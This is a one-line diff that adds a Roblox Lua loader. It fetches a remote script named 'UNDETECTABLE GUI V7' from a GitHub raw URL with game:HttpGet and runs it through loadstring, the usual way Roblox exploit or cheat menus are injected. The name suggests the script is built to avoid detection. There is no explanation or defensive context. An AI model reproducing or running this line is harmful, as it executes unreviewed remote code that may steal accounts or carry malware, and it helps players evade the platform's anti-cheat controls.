@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/pedroluckygod/Yes/main/UNDETECTABLE%20GUI%20V7"))()
